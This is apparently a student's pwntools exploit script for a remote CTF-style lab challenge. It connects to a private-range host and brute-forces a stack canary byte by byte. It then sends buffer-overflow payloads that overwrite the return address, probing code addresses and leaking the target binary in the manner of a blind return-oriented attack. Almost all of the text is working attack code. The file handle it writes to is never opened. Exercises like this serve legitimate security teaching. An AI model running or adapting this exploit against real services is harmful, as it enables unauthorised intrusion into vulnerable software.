from pwn import *
import code

context.log_level = 'debug'

sh = remote('10.15.201.97', 8090)    # pwntools通过socket连接至远端
sh.recvuntil("Please input your StudentID:\n") # 远程环境统一要求输入学号    
sh.sendline('3180105507')
sh.recvuntil('[-] INPUT something darker: \n')
canary='\x00'
for i in range(3):
    for byte in range(256):
        sh.send('a'*16+canary+chr(byte))
        a=sh.recvuntil("[-] INPUT something darker: \n")
        if b"[-] You are a good boy... \n" in a:
            canary+=chr(byte)
            break
log.info('canary is %#x' %(u32(canary)))
# code.interact(local=locals())

def get_addr():
    addr=0x80486a0
    sh.recv(1034,0.25)
    while addr<0x80489a0:
        addr+=1
        payload = b'a'*16 + p32(u32(canary))+b'0'*12 + p32(addr)
        sh.sendline(payload)
        content=sh.recvuntil('[-] INPUT something darker: \n')
        f.write(str(content))

def get_binary():
    payload2=b'a'*16 + p32(u32(canary))+b'0'*12 + p32(0x8048560)+p32(1)+p32(1)+p32(0x8048000)+p32(0x1000)
    sh.recv(1024,0.1)
    sh.sendline(payload2)
    content=sh.recvuntil('[-] INPUT something darker: \n')
    f.write(str(content))

# sh.sendline("./flag.exe 3180105507") 